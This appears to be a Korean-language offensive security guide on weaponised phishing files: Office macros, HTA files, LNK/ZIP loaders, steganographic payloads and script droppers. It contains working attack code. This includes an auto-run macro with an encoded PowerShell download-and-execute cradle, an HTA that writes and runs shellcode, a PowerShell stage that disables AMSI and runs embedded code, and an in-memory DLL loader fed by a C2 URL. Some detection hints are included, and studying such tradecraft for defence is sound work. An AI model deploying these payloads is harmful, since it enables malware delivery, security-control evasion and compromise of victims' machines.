# 피싱 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 검증을 수행합니다. 데이터 검증은 OfficeOpenXML 표준에 따른 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로를 포함한 Word 파일은 `.docm` 확장자를 사용합니다. 하지만 파일 확장자를 변경하여 파일 이름을 바꾸더라도 매크로 실행 기능은 유지될 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾸면 Microsoft Word가 이를 처리하여 매크로를 실행할 수 있게 됩니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite (Excel, PowerPoint etc.)의 모든 소프트웨어에 적용됩니다.

다음 명령으로 일부 Office 프로그램이 실행할 확장자를 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 외부 이미지 로드

다음으로 이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

문서에서 macros를 사용해 임의의 코드를 실행할 수 있습니다.

#### Autoload functions

더 흔할수록 AV가 이를 탐지할 가능성이 높아집니다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

다음으로 이동: **File > Info > Inspect Document > Inspect Document**, 그러면 Document Inspector 창이 나타납니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭하세요.

#### Doc 확장자

작업을 마친 후 **Save as type** 드롭다운에서 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\
이렇게 하는 이유는 **`.docx` 파일 안에는 macro를 저장할 수 없고** macro 사용 가능 확장자인 **`.docm`**에는 낙인(stigma)이 있기 때문입니다(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 웹/이메일 게이트웨이는 이를 전혀 차단합니다). 따라서 이 **레거시 `.doc` 확장자가 최선의 타협점**입니다.

#### 악성 Macros 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 파일

HTA는 HTML과 스크립팅 언어(예: VBScript 및 JScript)를 결합한 Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "fully trusted" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 이는 일반적으로 **Internet Explorer**와 함께 **설치**되어 있어 **`mshta`는 IE에 의존**합니다. 따라서 IE가 제거된 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication 강제

여러 가지 방법으로 **NTLM 인증을 "원격으로" 강제할 수** 있습니다. 예를 들어 사용자가 접근할 이메일이나 HTML에 **투명 이미지(invisible images)**를 추가하거나(HTTP MitM도 가능?), 피해자에게 폴더를 여는 것만으로 **인증을 트리거**하는 **파일의 주소**를 보낼 수 있습니다.

**다음 페이지에서 이러한 아이디어들과 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 인증을 훔칠 수 있을 뿐만 아니라 **perform NTLM relay attacks**도 수행할 수 있다는 점을 잊지 마세요:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 두 개의 정상적인 미끼 문서(PDF/DOCX)와 악성 .lnk를 포함한 ZIP을 배포합니다. 핵심은 실제 PowerShell 로더가 ZIP의 원시 바이트에서 고유 마커 뒤에 저장되어 있고, .lnk가 그것을 메모리상에서 파싱하여 완전히 실행한다는 점입니다.

.lnk PowerShell one-liner로 구현되는 전형적인 흐름:

1) 원본 ZIP을 일반적인 경로에서 찾습니다: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 그리고 현재 작업 디렉터리의 상위 폴더.  
2) ZIP 바이트를 읽어 하드코딩된 마커(예: xFIQCV)를 찾습니다. 마커 뒤의 모든 것이 임베디드된 PowerShell 페이로드입니다.  
3) ZIP을 %ProgramData%로 복사하여 그곳에서 압축을 풀고, 정당해 보이도록 미끼 .docx를 엽니다.  
4) 현재 프로세스에 대해 AMSI를 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 다음 단계의 난독화를 해제(예: 모든 # 문자 제거)하고 메모리에서 실행합니다.

임베디드 단계를 추출하고 실행하는 예제 PowerShell 스켈레톤:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 배포는 종종 신뢰할 수 있는 PaaS 하위 도메인(예: *.herokuapp.com)을 악용하며 페이로드를 조건부로 제공할 수 있음(예: IP/UA에 따라 무해한 ZIP 제공).
- 다음 단계는 자주 base64/XOR shellcode를 복호화한 뒤 디스크 아티팩트를 최소화하기 위해 Reflection.Emit + VirtualAlloc을 통해 실행함.

Persistence used in the same chain
- Microsoft Web Browser control의 COM TypeLib hijacking으로 IE/Explorer 또는 이를 임베드한 앱이 페이로드를 자동으로 재실행함. 세부사항과 바로 사용할 수 있는 명령은 다음 참조:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- ZIP을 찾기 위해 상위/사용자 폴더를 열거하고 미끼 문서를 여는 .lnk.
- AMSI 변조: [System.Management.Automation.AmsiUtils]::amsiInitFailed 사용.
- 신뢰된 PaaS 도메인에 호스팅된 링크로 끝나는 장기 실행 비즈니스 스레드.

## Steganography-delimited payloads in images (PowerShell stager)

최근 로더 체인은 난독화된 JavaScript/VBS를 전달해 Base64 PowerShell stager를 디코드·실행한다. 해당 stager는 이미지(종종 GIF)를 다운로드하며, 이 이미지에는 고유한 시작/종료 마커 사이에 평문으로 숨겨진 Base64-encoded .NET DLL이 포함되어 있다. 스크립트는 이러한 구분자(실제 사례에서 관찰된 예: «<<sudo_png>> … <<sudo_odt>>>»)를 검색해 사이 텍스트를 추출하고, Base64로 디코드해 바이트로 변환한 뒤 어셈블리를 in-memory로 로드하고 알려진 엔트리 메서드를 C2 URL과 함께 호출한다.

Workflow
- Stage 1: Archived JS/VBS dropper → 내장된 Base64를 디코드 → -nop -w hidden -ep bypass 옵션으로 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, 마커로 구분된 Base64를 추출(carve), .NET DLL을 in-memory로 로드한 뒤 해당 메서드(예: VAI)를 호출하면서 C2 URL 및 옵션 전달.
- Stage 3: 로더가 최종 페이로드를 가져와 일반적으로 process hollowing을 통해 신뢰된 바이너리(주로 MSBuild.exe)에 인젝션함. process hollowing 및 trusted utility proxy execution에 대한 자세한 내용은 다음 참조:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

노트
- 이는 ATT&CK T1027.003 (steganography/marker-hiding)입니다. 마커는 캠페인마다 다릅니다.
- AMSI/ETW bypass와 string deobfuscation는 어셈블리를 로드하기 전에 자주 적용됩니다.
- 탐지: 다운로드된 이미지에서 알려진 구분자(delimiters)를 검색하고, 이미지를 접근하여 즉시 Base64 블롭을 디코딩하는 PowerShell을 식별하세요.

참고: stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

반복적으로 나타나는 초기 단계는 압축 파일 안에 들어있는 작고 강하게 난독화된 `.js` 또는 `.vbs`입니다. 이 스크립트의 유일한 목적은 임베디드 Base64 문자열을 디코드하고 `-nop -w hidden -ep bypass` 옵션으로 PowerShell을 실행하여 HTTPS를 통해 다음 단계를 부트스트랩하는 것입니다.

기본 로직(추상):
- 자신의 파일 내용을 읽음
- 잡다한 문자열(junk strings) 사이의 Base64 blob을 찾음
- ASCII PowerShell로 디코드
- `wscript.exe`/`cscript.exe`가 `powershell.exe`를 호출하여 실행

탐지 단서
- 압축된 JS/VBS 첨부파일이 커맨드 라인에 `-enc`/`FromBase64String`를 포함해 `powershell.exe`를 실행함.
- `wscript.exe`가 사용자 temp 경로에서 `powershell.exe -nop -w hidden`을 실행함.

## Windows files to steal NTLM hashes

다음 페이지를 확인하세요: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
